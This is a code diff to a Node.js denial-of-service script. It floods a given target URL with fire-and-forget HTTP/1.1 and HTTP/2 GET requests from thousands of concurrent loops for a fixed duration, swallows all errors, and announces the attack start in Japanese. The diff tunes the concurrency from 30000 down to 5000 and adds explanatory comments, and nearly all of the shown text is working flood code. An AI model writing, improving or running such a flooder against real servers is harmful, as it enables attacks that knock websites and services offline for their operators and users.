@@ -2,10 +2,9 @@ const http = require('http');
 const https = require('https');
 const http2 = require('http2');
 const { URL } = require('url');
-const os = require('os');
 
-const THREADS = 30000; // Max threads for requests (adjust as needed)
-const TIME = 30 * 1000; // Time in ms (adjust duration)
+const THREADS = 5000;  // Limit max concurrent threads to 5k
+const TIME = 30 * 1000; // Duration in ms (you can adjust)
 let H1 = 0, H2 = 0, TOTAL = 0;
 
 function startAttack(target) {
@@ -14,29 +13,32 @@ function startAttack(target) {
     const port = url.port || (isHttps ? 443 : 80);
     const path = url.pathname + url.search;
 
-    // Fire HTTP/1.1 request
+    // Fire HTTP/1.1 request (no response handling)
     const fireH1 = () => {
         const req = (isHttps ? https : http).request({
             hostname: url.hostname,
             port,
             method: 'GET',
             path,
-            agent: false
-        }, () => {}).on('error', () => {});
+            agent: false // No agent, no keep-alive, just raw requests
+        }, () => {}); // No response handling, just fire and forget
+        req.on('error', () => {}); // Ignore any errors
         req.end();
         H1++;
     };
 
-    // Fire HTTP/2 request
+    // Fire HTTP/2 request (no response handling)
     const fireH2 = () => {
         try {
             const client = http2.connect(url.origin);
             const req = client.request({ ':path': path });
-            req.on('error', () => {});
-            req.end();
+            req.on('error', () => {}); // Ignore any errors
+            req.end(); // Fire and forget
             H2++;
-            client.close();
-        } catch {}
+            client.close(); // Close HTTP2 connection
+        } catch (err) {
+            // Ignore any connection errors
+        }
     };
 
     const startTime = Date.now();
@@ -55,6 +57,7 @@ function startAttack(target) {
     // Start the attack
     console.log("攻撃開始!\n");
 
+    // Use a loop to fire requests without blocking
     for (let i = 0; i < THREADS; i++) {
         setImmediate(() => {
             while (Date.now() < endTime) {
